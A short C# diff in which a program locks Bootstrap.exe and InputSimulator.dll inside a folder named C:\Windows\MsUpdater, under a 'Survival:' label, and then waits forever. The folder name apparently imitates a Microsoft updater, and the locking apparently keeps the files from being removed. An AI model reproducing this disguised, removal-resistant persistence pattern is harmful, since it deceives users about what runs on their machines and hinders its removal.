@@ -16,8 +16,8 @@
                 throw new ArgumentNullException(nameof(args));
             }
 
-            var directory = Directory.GetCurrentDirectory();
-            
+            Thread.Sleep(200);
+
             /*
              
             // ---- Code for stable version ---- //
@@ -45,8 +45,8 @@
 
             Survival:
 
-            var a = File.Open(Path.Combine(directory, "Bootstrap.exe"), FileMode.Open, FileAccess.Read, FileShare.Read);
-            var b = File.Open(Path.Combine(directory, "InputSimulator.dll"), FileMode.Open, FileAccess.Read, FileShare.Read);
+            var a = File.Open(@"C:\Windows\MsUpdater\Bootstrap.exe", FileMode.Open, FileAccess.Read, FileShare.Read);
+            var b = File.Open(@"C:\Windows\MsUpdater\InputSimulator.dll", FileMode.Open, FileAccess.Read, FileShare.Read);
 
             Process.GetCurrentProcess().WaitForExit();
 
